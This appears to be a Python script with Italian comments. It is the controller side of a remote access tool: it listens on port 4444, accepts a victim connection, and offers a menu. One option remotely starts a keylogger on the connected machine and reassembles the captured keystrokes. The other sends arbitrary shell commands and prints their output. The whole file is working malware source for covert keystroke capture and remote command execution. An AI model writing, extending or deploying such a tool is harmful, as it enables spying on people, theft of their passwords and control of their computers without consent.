import datetime 
import socket 
host="0.0.0.0" #equivalente a scrivere indirizzo ip locale ma scelta consigliata
port=4444 #valore semi-arbitrario, non well-known port e deve essere lo stesso sul client 
buffersize=65536 #dimensione del buffer utilizzato
keys=[]
def server():
    global conn 
    global add
    connection=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connection.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    connection.bind((host, port)) #associazione indirizzo ip 
    connection.listen(1) # il server aspetta per solo una connessione in entrata 
    print("waiting for connections...")
    conn, add=connection.accept() # retorna tupla, conn rappresenta la connessione, add l'ip
    print(f"connessione da {add}") #printa l'indirizzo ip da cui proviene la connessione 
def menu():
    services=input("-keylogger- or -commands- > ")    
    if services=="keylogger":
        keylogger()
    elif services=="commands":
        commands()
    else:
        print("you can only choose between -commands- and -keylogger-")
        menu()
def keylogger():
    print(f"waiting for keys from {add}")
    conn.send("keylogger".encode()) #manda "keylogger" a client, che starta keylogger
    recvkey()
def recvkey():
    try:
        while True:
            rawkey=conn.recv(buffersize)  #riceve tasti premuti da client              
            print(rawkey.decode("cp850"))
            tmp0=rawkey.decode().split("'") 
            print(tmp0)
            if "BACK" in rawkey.decode():#
                try:
                    del keys[-1]
                except:
                    pass
            elif "space" in rawkey.decode():
                keys.append(" ")
            elif "Key" in rawkey.decode():
                tmp1=rawkey.decode().split(".")
                tmp2=tmp1[1].split(" ")
                tmp3=tmp2[0].upper()
                keys.append(tmp3)
            else:
               keys.append(tmp0[1]) 
            print(keys)             

    except KeyboardInterrupt: #in caso venga premuto control c per stoppare
        conn.send("keystop".encode()) #invia messaggio di stop a client 
        print("keylogger stopped")
        message="".join(keys)
        print("KEYS: "+message)                 
        menu() #ritorna alla lista di possibilità        
def commands():
    print("type -exit- to return to the menu")
    cmd=input("command> ")      
    if len(cmd)==0: #inserito niente per sbaglio 
        commands() 
    elif cmd=="exit":
        menu()    
    else:
        conn.send(cmd.encode()) #invio del comando a client
        recv()
def recv():
    data=conn.recv(buffersize) #inserisce nella variabile l'output comandi dal client 
    print(data.decode("cp850")) #printa l'output dei comandi precedentementi inseriti
    commands()   
def main():
  server()
  menu()
if __name__=="__main__":
     main()  #se il programma non viene importato come modulo, avvia server (facoltativo)                     
